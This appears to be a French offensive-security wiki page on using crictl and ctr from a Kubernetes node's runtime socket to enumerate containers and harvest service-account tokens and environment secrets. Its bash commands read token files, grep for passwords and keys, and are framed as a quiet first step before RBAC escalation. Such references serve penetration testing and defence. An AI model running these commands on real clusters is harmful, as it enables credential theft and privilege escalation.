---
title: "Énumération avec crictl et ctr : cartographier un nœud avec les clients de runtime"
description: "Avant d'agir, les clients de runtime crictl et ctr énumèrent tout ce qui se trouve sur un nœud Kubernetes : les pods et conteneurs avec leurs images et montages, les images en cache et leur contenu, ainsi que l'environnement et les secrets projetés dans les conteneurs en cours d'exécution. Cette étape en lecture seule révèle fréquemment des jetons de compte de service et des informations d'authentification sans rien lancer."
keywords:
  - crictl
  - ctr
  - enumeration
  - service account token
  - kubernetes node
---

# Énumération avec crictl et ctr

Avec l'accès à un socket de runtime de nœud, les clients `crictl` (CRI) et `ctr` (natif de containerd) lisent l'intégralité de l'état des conteneurs du nœud. Énumérer d'abord est peu bruyant et souvent suffisant : les conteneurs des pods en cours d'exécution montent déjà des jetons de compte de service et contiennent des secrets d'environnement, donc les lire vaut mieux que lancer un nouveau conteneur. C'est la reconnaissance qui transforme l'accès au runtime du nœud en informations d'authentification du cluster.

```bash
export CONTAINER_RUNTIME_ENDPOINT=unix:///run/crio/crio.sock   # or containerd.sock
# every pod and container on the node, with state
crictl pods -v; crictl ps -a
# inspect a container for its mounts, env, and the pod it belongs to
crictl inspect <container-id> | jq '.status.mounts, .info.config.envs'
# ctr equivalent for containerd, in the k8s.io namespace
S=/run/containerd/containerd.sock
ctr --address $S -n k8s.io container ls
ctr --address $S -n k8s.io container info <id> | jq '.Spec.mounts, .Spec.process.env'
```

## Récolter les jetons et les secrets

```bash
# projected service-account tokens are mounted into pod containers
crictl inspect <id> | jq -r '.status.mounts[].hostPath' | grep -i serviceaccount
cat <that-hostPath>/token                               # a cluster SA token
# environment variables carry injected secrets
crictl inspect <id> | jq -r '.info.config.envs[] | "\(.key)=\(.value)"' | \
  grep -iE 'token|secret|password|key'
```

Le jeton de compte de service monté dans le conteneur d'un pod s'authentifie auprès de l'API Kubernetes sous l'identité de ce pod, ce qui suffit fréquemment à lire davantage de secrets ou, avec un RBAC permissif, à escalader.

## Notes d'exploitation

- L'énumération est en lecture seule et ne crée pas de conteneurs, c'est donc le premier geste discret dès qu'un socket est accessible.
- Les hostPaths des jetons projetés pointent vers le système de fichiers du nœud ; les lire nécessite un accès aux fichiers du nœud, que le même socket fournit via un conteneur, ou un accès direct si vous êtes déjà sur le nœud.
- Utilisez le jeton récolté contre le serveur d'API ; voir [Escalade de privilèges RBAC Kubernetes](../../orchestration/kubernetes/rbac-privilege-escalation/index.md) pour savoir ce qu'une identité donnée peut faire.

## Références

- [crictl user guide](https://github.com/kubernetes-sigs/cri-tools/blob/master/docs/crictl.md)
- [containerd ctr](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [Kubernetes: service account tokens](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)
